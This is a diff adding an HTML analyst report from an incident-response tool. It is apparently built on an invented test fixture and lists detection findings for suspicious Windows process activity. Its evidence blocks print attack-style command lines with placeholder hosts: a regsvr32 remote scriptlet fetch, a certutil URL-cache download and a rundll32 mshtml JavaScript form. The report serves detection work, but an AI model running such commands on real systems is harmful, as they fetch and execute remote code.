@@ -1,0 +1,1548 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IRSnapshot analyst report · 00000000-0000-0000-0000-0000000000c9</title>
+<style>
+:root { color-scheme: light; --ink:#172b3a; --muted:#435b6e; --line:#c9d5de; --paper:#fff; --wash:#edf3f6; --accent:#005a70; }
+* { box-sizing:border-box; } body { margin:0; background:var(--wash); color:var(--ink); font:16px/1.55 system-ui,sans-serif; }
+a { color:var(--accent); text-underline-offset:.18em; } a:focus-visible,summary:focus-visible { outline:3px solid #b14b00; outline-offset:3px; }
+header,main,footer { max-width:1180px; margin:auto; padding:2rem; } header { padding-top:3rem; }
+.eyebrow { font-size:.78rem; font-weight:700; letter-spacing:.12em; text-transform:uppercase; color:var(--accent); }
+h1 { font-size:clamp(2rem,4vw,3.3rem); line-height:1.1; letter-spacing:-.04em; margin:.6rem 0 1rem; }
+h2 { font-size:1.45rem; margin:0 0 1.2rem; } h3 { font-size:1.1rem; } p { margin:.65rem 0; } .muted { color:var(--muted); }
+nav { display:flex; flex-wrap:wrap; gap:.6rem 1.2rem; margin-top:1.5rem; } main { padding-top:0; }
+section { background:var(--paper); border-top:3px solid var(--accent); padding:1.7rem; margin-bottom:1.5rem; scroll-margin-top:1rem; }
+.counts { display:flex; flex-wrap:wrap; gap:1rem 2rem; margin:1rem 0; } .counts strong { display:block; font-size:1.65rem; }
+.status { display:inline-block; padding:.18rem .55rem; border:1px solid var(--line); border-radius:.2rem; font-weight:700; }
+.partial,.incomplete { color:#7c3100; background:#fff0df; } .complete { color:#174c32; background:#eaf6ed; }
+.critical,.high { color:#8a1720; background:#ffedf0; } .medium { color:#754100; background:#fff1d9; } .low,.informational { color:#174b68; background:#eaf3ff; }
+.table-wrap { overflow-x:auto; } table { width:100%; border-collapse:collapse; font-size:.92rem; } caption { text-align:left; font-weight:700; margin-bottom:.7rem; }
+.coverage-table { min-width:650px; table-layout:fixed; } .coverage-table col:nth-child(1) { width:11rem; } .coverage-table col:nth-child(2) { width:6rem; } .coverage-table col:nth-child(3),.coverage-table col:nth-child(5) { width:4rem; }
+.coverage-table th,.coverage-table td:nth-child(2),.coverage-table td:nth-child(3),.coverage-table td:nth-child(5) { white-space:nowrap; }
+.network-table { min-width:800px; table-layout:fixed; } .network-table col:nth-child(1) { width:8rem; } .network-table col:nth-child(2) { width:32%; } .network-table col:nth-child(3) { width:10rem; } .network-table th,.compact { white-space:nowrap; }
+th,td { text-align:left; vertical-align:top; border-bottom:1px solid var(--line); padding:.7rem .55rem; overflow-wrap:anywhere; } th { background:var(--wash); }
+code,pre { font: .86rem/1.5 ui-monospace,monospace; white-space:pre-wrap; overflow-wrap:anywhere; word-break:break-word; } pre { padding:1rem; background:#f2f5f7; border:1px solid var(--line); }
+dl { display:grid; grid-template-columns:minmax(9rem,1fr) 3fr; gap:.35rem 1rem; } dt { font-weight:600; } dd { margin:0; overflow-wrap:anywhere; }
+article { border:1px solid var(--line); border-left:4px solid var(--accent); padding:1.15rem; margin:1rem 0; overflow-wrap:anywhere; }
+article h3 { margin:.6rem 0; } details { border-bottom:1px solid var(--line); padding:.7rem 0; } summary { cursor:pointer; font-weight:600; overflow-wrap:anywhere; }
+.note { border-left:3px solid #7892a3; padding:.6rem 1rem; background:#f2f6f8; } .depth { color:var(--muted); display:block; font-size:.8rem; }
+@media(max-width:640px) { header,main,footer { padding:1rem; } section { padding:1rem; } dl { grid-template-columns:1fr; } dd { margin-bottom:.5rem; } }
+@media print { .table-wrap { overflow:visible; } .coverage-table,.network-table { min-width:0; table-layout:auto; } .coverage-table th,.coverage-table td,.network-table th,.compact { white-space:normal; } body { background:white; font-size:10pt; } header,main,footer { padding:.4rem; max-width:none; } nav { display:none; } section { border-top:1px solid #435b6e; padding:.6rem 0; } article { break-inside:avoid; } th { background:white; } a { color:inherit; } details { break-inside:auto; } }
+</style>
+</head>
+<body>
+<header>
+<div class="eyebrow">IRSnapshot · Local incident response</div>
+<h1>Analyst investigation report</h1>
+<p>Host unavailable · <code>00000000-0000-0000-0000-0000000000c9</code></p>
+<p class="muted">Captured 2026-09-17T14:05:00Z (UTC) — 2026-09-17T14:05:10Z (UTC)<br>Capture tool 0.3.0 · Snapshot schema 1.0 · Analysis schema 1.0 · Ruleset 1.0.0</p>
+<nav aria-label="Report sections">
+<a href="#summary">Summary</a><a href="#system">System</a><a href="#findings">Findings</a><a href="#ancestry">Process ancestry</a><a href="#processes">Referenced processes</a><a href="#network">Network</a><a href="#persistence">Persistence</a><a href="#timeline">Timeline</a><a href="#issues">Issues</a><a href="#raw">Raw evidence</a>
+</nav>
+</header>
+<main>
+<section id="summary">
+<h2>Summary and collection coverage</h2>
+<p><span class="status partial">Partial investigation</span> · Analysis: <strong>Complete</strong></p>
+<p>Findings are review priorities from supported rules, not verdicts. Associations do not inherit severity.</p>
+<div class="counts"><div><strong>0</strong>critical findings</div><div><strong>5</strong>high findings</div><div><strong>5</strong>medium findings</div><div><strong>1</strong>low findings</div><div><strong>0</strong>informational findings</div></div>
+
+<div class="table-wrap"><table class="coverage-table"><colgroup><col><col><col><col><col></colgroup><caption>Collection coverage</caption><thead><tr><th scope="col">Source</th><th scope="col">Status</th><th scope="col">Items</th><th scope="col">Scope and limits</th><th scope="col">Issues</th></tr></thead><tbody>
+<tr id="coverage-system"><th scope="row">system</th><td>failed</td><td>0</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>1</td></tr><tr id="coverage-processes"><th scope="row">processes</th><td>partial</td><td>10</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>1</td></tr><tr id="coverage-network"><th scope="row">network</th><td>failed</td><td>0</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>1</td></tr><tr id="coverage-users"><th scope="row">users</th><td>ok</td><td>1</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>0</td></tr><tr id="coverage-services"><th scope="row">services</th><td>ok</td><td>1</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>0</td></tr><tr id="coverage-scheduled_tasks"><th scope="row">scheduled_tasks</th><td>ok</td><td>1</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>0</td></tr><tr id="coverage-persistence"><th scope="row">persistence</th><td>ok</td><td>3</td><td><p>Invented review fixture only; not a live collection or a complete Windows inventory.</p></td><td>0</td></tr>
+</tbody></table></div>
+<p class="muted">Zero items means none captured within the recorded scope. Partial, failed, and skipped sources cannot establish absence.</p>
+</section>
+<section id="system"><h2>System and identity</h2>
+<p>System information unavailable. Source status: <strong>failed</strong>. <a href="#coverage-system">Review system coverage and limits</a>.</p>
+<details><summary>User and session inventory · 1 items</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000004&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;users&#34;,
+  &#34;name&#34;: &#34;ExampleUser&#34;,
+  &#34;domain&#34;: &#34;EXAMPLE-LAB&#34;,
+  &#34;sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+  &#34;source&#34;: &#34;current_token&#34;,
+  &#34;enabled&#34;: true,
+  &#34;session_name&#34;: null,
+  &#34;logged_in_at&#34;: null,
+  &#34;member_of_sid&#34;: null
+}</pre></details>
+</section>
+<section id="findings"><h2>Findings · 11</h2>
+<article id="finding-4e656e63-016d-54d9-8eab-8cf38283c92a">
+<span class="status high">high</span> <code>IRS-P003</code><h3>Office spawned PowerShell</h3><p>A recognized Office basename directly parented a PowerShell host with a temporally consistent link. Legitimate Office automation can do this; basename evidence does not verify the publisher or establish exploitation.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000582">00000000-0000-0000-0000-000000000582</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058c">00000000-0000-0000-0000-00000000058c</a> · PIDs: 410, 420</p>
+<details><summary>Evidence · parent.created_at</summary><p>Captured parent creation time required for a temporally consistent tree link.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000582</code></p><pre>&#34;2026-09-17T14:00:01+00:00&#34;</pre></details><details><summary>Evidence · parent.executable</summary><p>Captured parent identity used for case-insensitive basename matching.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000582</code></p><pre>&#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;</pre></details><details><summary>Evidence · child.created_at</summary><p>Captured child creation time required for a temporally consistent tree link.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058c</code></p><pre>&#34;2026-09-17T14:00:02+00:00&#34;</pre></details><details><summary>Evidence · child.executable</summary><p>Captured direct-child identity used for basename matching.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058c</code></p><pre>&#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;</pre></details><details><summary>Evidence · relationship</summary><p>The deterministic tree linked both collected records directly.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058c</code></p><pre>&#34;direct child of PID 410&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000582">WINWORD.EXE (PID 410)</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058c">powershell.exe (PID 420)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd><a href="#artifact-00000000-0000-0000-0000-00000000058d">cmd.exe (PID 421)</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058e">wscript.exe (PID 422)</a></dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-88ddbb83-0acb-5b9c-9010-e917391a380c">
+<span class="status high">high</span> <code>IRS-P005</code><h3>Office spawned script host</h3><p>A recognized Office basename directly parented a Windows script host with a temporally consistent link. Legitimate scripted workflows exist; basename evidence does not verify the publisher or characterize script contents.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000582">00000000-0000-0000-0000-000000000582</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058e">00000000-0000-0000-0000-00000000058e</a> · PIDs: 410, 422</p>
+<details><summary>Evidence · parent.created_at</summary><p>Captured parent creation time required for a temporally consistent tree link.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000582</code></p><pre>&#34;2026-09-17T14:00:01+00:00&#34;</pre></details><details><summary>Evidence · parent.executable</summary><p>Captured parent identity used for case-insensitive basename matching.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000582</code></p><pre>&#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;</pre></details><details><summary>Evidence · child.created_at</summary><p>Captured child creation time required for a temporally consistent tree link.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058e</code></p><pre>&#34;2026-09-17T14:00:04+00:00&#34;</pre></details><details><summary>Evidence · child.executable</summary><p>Captured direct-child identity used for basename matching.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058e</code></p><pre>&#34;C:\\Windows\\System32\\wscript.exe&#34;</pre></details><details><summary>Evidence · relationship</summary><p>The deterministic tree linked both collected records directly.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058e</code></p><pre>&#34;direct child of PID 410&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000582">WINWORD.EXE (PID 410)</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058e">wscript.exe (PID 422)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd><a href="#artifact-00000000-0000-0000-0000-00000000058c">powershell.exe (PID 420)</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058d">cmd.exe (PID 421)</a></dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-3a4512c4-5fe0-5eb3-bd68-64a17fab0bba">
+<span class="status high">high</span> <code>IRS-P009</code><h3>Rundll32 JavaScript/mshtml form</h3><p>Rundll32 used an explicit JavaScript/mshtml RunHTMLApplication form. This rule does not match a normal DLL/export invocation and does not interpret or execute the later script data.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-0000000005a1">00000000-0000-0000-0000-0000000005a1</a> · PIDs: 441</p>
+<details><summary>Evidence · command_line</summary><p>Captured argv tokens preserved as evidence; no token was executed.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a1</code></p><pre>[
+  &#34;C:\\Windows\\System32\\rundll32.exe&#34;,
+  &#34;javascript:\&#34;..\\mshtml,RunHTMLApplication\&#34;;/* inert synthetic marker */&#34;
+]</pre></details><details><summary>Evidence · executable</summary><p>Captured executable path; it is not a publisher or signature assertion.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a1</code></p><pre>&#34;C:\\Windows\\System32\\rundll32.exe&#34;</pre></details><details><summary>Evidence · script_pattern</summary><p>The explicit script-oriented pattern occupies argv index 1.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a1</code></p><pre>&#34;javascript:\&#34;..\\mshtml,RunHTMLApplication\&#34;;/* inert synthetic marker */&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-0000000005a1">rundll32.exe (PID 441)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-87bd0b77-ac59-539a-a23f-7319bc845375">
+<span class="status high">high</span> <code>IRS-P010</code><h3>Regsvr32 remote scriptlet form</h3><p>Regsvr32 combined a remote /i: argument with scrobj.dll. Normal local component registration does not satisfy this form; the evidence still does not prove execution.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-0000000005a2">00000000-0000-0000-0000-0000000005a2</a> · PIDs: 442</p>
+<details><summary>Evidence · scriptlet_target</summary><p>A separate target token has the exact Windows basename scrobj.dll.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a2</code></p><pre>&#34;scrobj.dll&#34;</pre></details><details><summary>Evidence · command_line</summary><p>Captured argv tokens preserved as evidence; no token was executed.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a2</code></p><pre>[
+  &#34;C:\\Windows\\System32\\regsvr32.exe&#34;,
+  &#34;/s&#34;,
+  &#34;/n&#34;,
+  &#34;/u&#34;,
+  &#34;/i:https://scripts.example.invalid/example.sct&#34;,
+  &#34;scrobj.dll&#34;
+]</pre></details><details><summary>Evidence · executable</summary><p>Captured executable path; it is not a publisher or signature assertion.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a2</code></p><pre>&#34;C:\\Windows\\System32\\regsvr32.exe&#34;</pre></details><details><summary>Evidence · remote_install_argument</summary><p>Inline /i: argument contains a standalone HTTP(S) value.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a2</code></p><pre>&#34;/i:https://scripts.example.invalid/example.sct&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-0000000005a2">regsvr32.exe (PID 442)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-82825a4d-5611-5247-b235-e3fcfce02a85">
+<span class="status high">high</span> <code>IRS-R003</code><h3>Service executable in a user-writable directory</h3><p>A service command&#39;s explicit executable is in a conventional user-writable location identified from captured roots. This lexical heuristic does not establish an exploitable ACL or malicious service; development tools and per-user service software are plausible benign explanations.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000005">00000000-0000-0000-0000-000000000005</a> · PIDs: none</p>
+<details><summary>Evidence · username</summary><p>Captured service account name; no SID or privilege is inferred.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;LocalSystem&#34;</pre></details><details><summary>Evidence · name</summary><p>Captured service name.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;ExampleService&#34;</pre></details><details><summary>Evidence · startup_type</summary><p>Captured service startup type.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;automatic&#34;</pre></details><details><summary>Evidence · status</summary><p>Captured service status; it is not installation-time evidence.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;stopped&#34;</pre></details><details><summary>Evidence · path_basis</summary><p>Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;The normalized path is within a captured local_appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;</pre></details><details><summary>Evidence · command</summary><p>Original service command; it was not executed or rewritten.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;\&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\&#34; --synthetic&#34;</pre></details><details><summary>Evidence · interpreted_target</summary><p>The explicit executable or supported script target retained from evidence.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe&#34;</pre></details><details><summary>Evidence · target_provenance</summary><p>The parser records how the target was obtained without executing it.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000005</code></p><pre>&#34;raw_command_executable&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd>none</dd><dt>Ancestors</dt><dd>none</dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-9b3adc97-9c46-55d7-82d8-bf20872ce78a">
+<span class="status medium">medium</span> <code>IRS-P004</code><h3>Office spawned command shell</h3><p>A recognized Office basename directly parented cmd.exe with a temporally consistent link. Legitimate Office automation can launch a shell; basename evidence does not verify the publisher or establish exploitation.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000582">00000000-0000-0000-0000-000000000582</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058d">00000000-0000-0000-0000-00000000058d</a> · PIDs: 410, 421</p>
+<details><summary>Evidence · parent.created_at</summary><p>Captured parent creation time required for a temporally consistent tree link.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000582</code></p><pre>&#34;2026-09-17T14:00:01+00:00&#34;</pre></details><details><summary>Evidence · parent.executable</summary><p>Captured parent identity used for case-insensitive basename matching.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000582</code></p><pre>&#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;</pre></details><details><summary>Evidence · child.created_at</summary><p>Captured child creation time required for a temporally consistent tree link.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058d</code></p><pre>&#34;2026-09-17T14:00:03+00:00&#34;</pre></details><details><summary>Evidence · child.executable</summary><p>Captured direct-child identity used for basename matching.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058d</code></p><pre>&#34;C:\\Windows\\System32\\cmd.exe&#34;</pre></details><details><summary>Evidence · relationship</summary><p>The deterministic tree linked both collected records directly.</p><p>Artifact: <code>00000000-0000-0000-0000-00000000058d</code></p><pre>&#34;direct child of PID 410&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000582">WINWORD.EXE (PID 410)</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058d">cmd.exe (PID 421)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd><a href="#artifact-00000000-0000-0000-0000-00000000058c">powershell.exe (PID 420)</a>, <a href="#artifact-00000000-0000-0000-0000-00000000058e">wscript.exe (PID 422)</a></dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-3f9c0ab6-6e28-5afd-854a-6e6746f658c4">
+<span class="status medium">medium</span> <code>IRS-P006</code><h3>Process executable in TEMP</h3><p>The captured executable path is in an identified TEMP directory. Installers and updaters commonly execute there, so the location warrants review but is not a trust conclusion.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000596">00000000-0000-0000-0000-000000000596</a> · PIDs: 430</p>
+<details><summary>Evidence · executable</summary><p>Captured executable path required by this location rule.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000596</code></p><pre>&#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe&#34;</pre></details><details><summary>Evidence · path_basis</summary><p>Classifier basis; this makes no ACL, trust, or existence claim.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000596</code></p><pre>&#34;The normalized path is within a captured temp root; this is a lexical location hint, not an ACL or trust decision.&#34;</pre></details><details><summary>Evidence · normalized_path</summary><p>Lexically normalized Windows path derived only from captured context.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000596</code></p><pre>&#34;c:\\users\\exampleuser\\appdata\\local\\temp\\example-installer.exe&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000596">example-installer.exe (PID 430)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-268e5ec8-2180-5764-a0dd-9ba61d980e48">
+<span class="status medium">medium</span> <code>IRS-P008</code><h3>Certutil remote forced retrieval</h3><p>Certutil combined -urlcache and forced retrieval with a standalone HTTP(S) source. Legitimate certificate administration can fetch remote material, so review the source and workflow.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-0000000005a0">00000000-0000-0000-0000-0000000005a0</a> · PIDs: 440</p>
+<details><summary>Evidence · command_line</summary><p>Captured argv tokens preserved as evidence; no token was executed.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a0</code></p><pre>[
+  &#34;C:\\Windows\\System32\\certutil.exe&#34;,
+  &#34;-urlcache&#34;,
+  &#34;-split&#34;,
+  &#34;-f&#34;,
+  &#34;https://downloads.example.invalid/sample.txt&#34;,
+  &#34;C:\\IRSnapshotFixtures\\sample.txt&#34;
+]</pre></details><details><summary>Evidence · executable</summary><p>Captured executable path; it is not a publisher or signature assertion.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a0</code></p><pre>&#34;C:\\Windows\\System32\\certutil.exe&#34;</pre></details><details><summary>Evidence · download_options</summary><p>Exact supported certutil option tokens found in captured argv.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a0</code></p><pre>[
+  &#34;-urlcache&#34;,
+  &#34;-split&#34;,
+  &#34;-f&#34;
+]</pre></details><details><summary>Evidence · remote_source</summary><p>Standalone HTTP(S) URLCache positional source after supported no-value flags.</p><p>Artifact: <code>00000000-0000-0000-0000-0000000005a0</code></p><pre>&#34;https://downloads.example.invalid/sample.txt&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-0000000005a0">certutil.exe (PID 440)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-3412a101-2845-5107-9935-047196c427e6">
+<span class="status medium">medium</span> <code>IRS-R001</code><h3>Run-key target in a user-writable directory</h3><p>A Run-key command has an explicit executable or supported script target in a conventional user-writable location identified from captured roots. This is a lexical heuristic; legitimate logon software can use the same locations.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000008">00000000-0000-0000-0000-000000000008</a> · PIDs: none</p>
+<details><summary>Evidence · entry_name</summary><p>Captured Run-key value name.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;ExampleStartup&#34;</pre></details><details><summary>Evidence · owner_sid</summary><p>Captured owner SID used only for owner-scoped environment expansion.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;S-1-5-21-100-200-300-1001&#34;</pre></details><details><summary>Evidence · location</summary><p>Captured registry location and owner scope.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&#34;</pre></details><details><summary>Evidence · path_basis</summary><p>Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;</pre></details><details><summary>Evidence · command</summary><p>Original Run-key command; it was not executed or rewritten.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;\&#34;%APPDATA%\\ExampleVendor\\startup.exe\&#34; --synthetic&#34;</pre></details><details><summary>Evidence · interpreted_target</summary><p>The explicit executable or supported script target retained from evidence.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;%APPDATA%\\ExampleVendor\\startup.exe&#34;</pre></details><details><summary>Evidence · target_provenance</summary><p>The parser records how the target was obtained without executing it.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000008</code></p><pre>&#34;raw_command_executable&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd>none</dd><dt>Ancestors</dt><dd>none</dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-a58a7be7-0f54-5b6e-bafa-a1ee8782f40e">
+<span class="status medium">medium</span> <code>IRS-R002</code><h3>Scheduled-task target in AppData or TEMP</h3><p>One or more scheduled-task actions have an explicit executable or supported script target in conventional AppData or TEMP locations identified from captured roots. This is a lexical heuristic; legitimate per-user automation can use these locations.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000006">00000000-0000-0000-0000-000000000006</a> · PIDs: none</p>
+<details><summary>Evidence · enabled</summary><p>Captured enabled state; disabled tasks remain inventory and findings.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>false</pre></details><details><summary>Evidence · task_path</summary><p>Captured full task namespace path.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;\\Examples\\&#34;</pre></details><details><summary>Evidence · name</summary><p>Captured task name.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;ExampleTask&#34;</pre></details><details><summary>Evidence · principal</summary><p>Captured task principal; no SID is inferred from this name.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;ExampleUser&#34;</pre></details><details><summary>Evidence · state</summary><p>Captured task state; it is not evidence that the task ran.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;Disabled&#34;</pre></details><details><summary>Evidence · actions[0].path_basis</summary><p>Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;</pre></details><details><summary>Evidence · actions[1].path_basis</summary><p>Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;The normalized path is within a captured temp root; this is a lexical location hint, not an ACL or trust decision.&#34;</pre></details><details><summary>Evidence · actions[0].executable</summary><p>Original separately collected task executable field.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;</pre></details><details><summary>Evidence · actions[1].executable</summary><p>Original separately collected task executable field.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;</pre></details><details><summary>Evidence · actions[0].arguments</summary><p>Original task argument string; it was not executed.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;--synthetic&#34;</pre></details><details><summary>Evidence · actions[1].arguments</summary><p>Original task argument string; it was not executed.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;-NoProfile -File \&#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\&#34;&#34;</pre></details><details><summary>Evidence · actions[0].target</summary><p>The explicit executable or supported script target retained from evidence.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;</pre></details><details><summary>Evidence · 